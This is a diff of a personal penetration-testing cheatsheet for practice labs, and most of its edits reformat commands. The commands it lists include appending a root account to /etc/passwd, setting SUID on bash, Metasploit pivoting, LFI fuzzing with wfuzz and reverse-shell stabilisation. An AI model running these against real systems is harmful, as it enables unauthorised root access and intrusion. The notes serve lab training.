@@ -1,5 +1,5 @@
 # My Notes / Cheatsheet
-### Last Updated: 06 Jul 2021
+### Last Updated: 15 Jul 2021
 Notes related to Vuln Assmnt/PenTesting 
 
 #### Approach for Compromising a box
@@ -86,14 +86,14 @@ chmod +s /bin/bash
 > 1. username:password === skinny1:123 ```echo 'skinny1:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd```
 
 #### Pivoting crap - MSF, socks4a and proxychains
-> 1. use msf exploit/multi/handler
+> 1. ``` use msf exploit/multi/handler ```
 > 1. get session as reverse shell
-> 1. upgrade the session to meterpreter by running command --> sessions -u 1
-> 1. go to upgraded meterpreter session and type the autoroute command ---> run autoroute -s <the network you want to access>
-> 1. to see if the new network is accessible, run **ping sweep* by typing command --->  use -> multi/gather/ping_sweep. use new network and meterpreter session number.
+> 1. upgrade the session to meterpreter by running command --> ``` sessions -u 1 ```
+> 1. go to upgraded meterpreter session and type the autoroute command ---> ``` run autoroute -s <the network you want to access> ```
+> 1. to see if the new network is accessible, run **ping sweep* by typing command --->  ``` use -> multi/gather/ping_sweep ```. use new network and meterpreter session number.
 > 1. to set up socks4a server ---> use auxiliary/server/socks4a
 > 1. edit proxychains.conf, add sock4a proxy with 127.0.0.1 and port 1080.
-> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like sudo proxychains nmap --sT sC -sV -r -v -Pn <IP> 
+> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like sudo proxychains ``` nmap --sT sC -sV -r -v -Pn <IP> ```
   
 #### cgi-bin folder or ShellShock
 > e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
@@ -122,7 +122,7 @@ chmod +s /bin/bash
 > socat TCP-LISTEN:8089,fork TCP:127.0.0.1:8080
 
 #### wpscan commands
-> 1.  wpscan -e ap --rua --disable-tls-checks --detection-mode aggressive --plugins-detection aggressive --url https://xxx.xxx
+> 1.  ``` wpscan -e ap --rua --disable-tls-checks --detection-mode aggressive --plugins-detection aggressive --url https://xxx.xxx ```
 
 #### Local --- SSH Port forwarding local service 5901 (VNC) - HackMyVM Box Level
 > 1. using SSH (Kali IP: 192.168.10.100, Level IP: 192.168.10.11).\
@@ -136,36 +136,36 @@ chmod +s /bin/bash
 ```ssh -R 192.168.10.101:8081:127.0.0.1:8080 root@<KALI IP> ```
 
 #### Fuzzing LFI
-> 1. wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
+> 1. ``` wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
 test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http
 ://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x8
-6_64; rv:78.0) Gecko/20100101 Firefox/78.0"
-> 1. wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
+6_64; rv:78.0) Gecko/20100101 Firefox/78.0" ```
+> 1. ``` wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
 test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http
 ://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x8
-6_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP
+6_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP ```
   
 #### Subdomain enum 
-> 1. wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.local" --hw 2867 -t 50 192.168.10.33
-> 1. gobuster vhost -q -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 192.168.10.33
+> 1. ``` wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.local" --hw 2867 -t 50 192.168.10.33 ```
+> 1. ``` gobuster vhost -q -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 192.168.10.33 ```
 #### Making Shell Interactive - Linux 
 > 1. **In reverse shell** 
-> 1. python -c 'import pty; pty.spawn("/bin/bash")'
-> 1. python3 -c 'import pty; pty.spawn("/bin/bash")'
-> 1. Ctrl-Z
+> 1. ``` python -c 'import pty; pty.spawn("/bin/bash")' ```
+> 1. ``` python3 -c 'import pty; pty.spawn("/bin/bash")' ```
+> 1. ``` Ctrl-Z ```
 
 > 1.  **In Attacker console**
-> 1. stty raw -echo
-> 1. fg
+> 1. ``` stty raw -echo ```
+> 1. ``` fg ```
 
 > 1. **In reverse shell**
-> 1. reset
-> 1. export SHELL=bash
-> 1. export TERM=xterm-256color
-> 1. stty rows <num> columns <cols>; e.g stty rows 29 columns 103
+> 1. ``` reset ```
+> 1. ``` export SHELL=bash ```
+> 1. ``` export TERM=xterm-256color ```
+> 1. ``` stty rows <num> columns <cols>; e.g stty rows 29 columns 103 ```
 
 > 1. **In Attacker console**
-> 1. stty size (to find ROWS and COLUMNS value)
+> 1. ``` stty size ``` (to find ROWS and COLUMNS value)
 
 #### Setting up PHP server
 > 1. To execute a PHP script file, in command line simply type -> php <file name.php>
